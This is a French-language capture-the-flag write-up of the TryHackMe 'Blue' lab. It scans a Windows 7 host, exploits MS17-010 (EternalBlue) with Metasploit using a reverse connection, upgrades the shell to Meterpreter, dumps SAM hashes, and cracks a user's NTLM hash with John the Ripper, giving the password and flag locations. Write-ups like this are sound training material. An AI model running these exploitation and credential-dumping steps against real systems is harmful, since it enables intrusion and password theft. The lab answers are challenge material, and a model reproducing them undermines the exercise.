# Write-up : TryHackMe - Blue

* **Date :** 06/01/2026
* **Auteur :** SAINTY Yann
* **Catégorie :** Network / Windows / Exploitation
* **Difficulté :** Facile
* **Lien :** [TryHackMe | Blue](https://tryhackme.com/room/blue)

## 1. Introduction & Scénario

"Blue" est une machine virtuelle conçue pour démontrer la sévérité de la vulnérabilité MS17-010, plus connue sous le nom d'**EternalBlue**. L'objectif est de scanner la machine, d'identifier la faille critique dans le protocole SMB, de l'exploiter à l'aide de Metasploit pour obtenir un accès système, et enfin de consolider cet accès en migrant vers des processus stables pour extraire les mots de passe utilisateurs.

## 2. Reconnaissance & Énumération

### Scan Nmap

Je commence par une analyse classique des ports pour identifier les services et le système d'exploitation cible. J'utilise les options `-sC` (scripts par défaut) et `-sV` (versions).

```bash
nmap -sC -sV 10.82.143.148

```

**Résultats du scan :**

```text
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
3389/tcp  open  tcpwrapped   (RDP)

```

L'information clé ici est la version précise de Windows (**Windows 7 Professional 7601 SP1**) sur le port 445. Cette version est historiquement connue pour être vulnérable à certaines attaques SMB critiques.

### Scan de Vulnérabilité

Pour confirmer mes soupçons, j'utilise le moteur de script Nmap (`--script vuln`) afin de détecter automatiquement les failles connues sur cette version.

```bash
nmap --script vuln 10.82.143.148

```

**Résultat critique :**
Le script `smb-vuln-ms17-010` retourne un résultat positif :

> **VULNERABLE:** Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

La machine est donc vulnérable à **EternalBlue**, une faille permettant l'exécution de code à distance (RCE) avec des privilèges élevés.

## 3. Exploitation (Metasploit)

Je lance **Metasploit Framework** pour rechercher et configurer l'exploit correspondant.

### Recherche et Configuration

Je cherche le module associé à la vulnérabilité identifiée :

```bash
search ms17-010

```

Je sélectionne l'exploit `exploit/windows/smb/ms17_010_eternalblue` (généralement l'option 0).

Je configure ensuite les paramètres essentiels :

1. **Cible (RHOSTS) :** L'IP de la machine.
2. **Attaquant (LHOST) :** Mon interface VPN `tun0` pour le retour de connexion.

```bash
use 0
set RHOSTS 10.82.143.148
set LHOST tun0
exploit

```

*Note : L'exploit étant instable, il a fallu redémarrer la machine cible une fois durant le processus (nouvelle IP : 10.81.168.196).*

### Accès Initial

L'exploit fonctionne et ouvre une session de type "Command Shell". Étant donné la nature de la faille (Kernel exploit), j'obtiens immédiatement les droits les plus élevés sur la machine : **NT AUTHORITY\SYSTEM**.

## 4. Post-Exploitation & Stabilisation

### Conversion en Meterpreter

Le shell obtenu par défaut est basique (`cmd.exe`). Pour faciliter les actions suivantes, je le transforme en session **Meterpreter** via un module de post-exploitation.

```bash
# Je mets la session 1 en background avec CTRL+Z
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST tun0
run

```

Cela ouvre une nouvelle session (Session 2) qui est un Meterpreter complet.

### Migration de Processus

L'exploit EternalBlue peut rendre le processus initial instable, risquant de faire planter la machine (BSOD). Pour sécuriser mon accès, je migre vers un processus système stable.

Je liste les processus avec `ps` et j'en identifie un s'exécutant sous `NT AUTHORITY\SYSTEM` (ex: `spoolsv.exe`).

```bash
migrate 712

```

*(Le PID 712 correspondait ici au service spoolsv.exe).*

### Cracking de Mots de Passe (Looting)

Maintenant que l'accès est stable, je peux extraire les hashs des mots de passe des utilisateurs depuis la base SAM.

```bash
hashdump

```

Je récupère le hash de l'utilisateur **Jon** :
`Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`

### Cassage du Hash

Je copie ce hash dans un fichier `hash.txt` sur ma machine locale et j'utilise **John The Ripper** avec le format NTLM (`format=nt`) et la wordlist `rockyou.txt`.

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

**Résultat :** John trouve le mot de passe presque instantanément.

* Utilisateur : **Jon**
* Mot de passe : **alqfna22**

## 5. Drapeaux (Flags)

En naviguant dans le système de fichiers via le Meterpreter, les 3 drapeaux demandés sont localisés aux endroits stratégiques :

1. **Flag 1 :** À la racine du disque `C:\`.
2. **Flag 2 :** Dans le dossier de configuration Windows où sont stockés les secrets (`C:\Windows\System32\config`).
3. **Flag 3 :** Dans les documents de l'utilisateur Jon (`C:\Users\Jon\Documents`).

## Conclusion

Ce challenge met en évidence l'importance critique des mises à jour de sécurité. Une simple machine Windows 7 non patchée peut être compromise totalement (accès SYSTEM) en quelques minutes grâce à des outils automatisés comme Metasploit, sans même avoir besoin d'identifiants valides au préalable. La stabilisation (migration) et le pillage (hashdump) sont ensuite des formalités une fois l'accès administrateur obtenu.
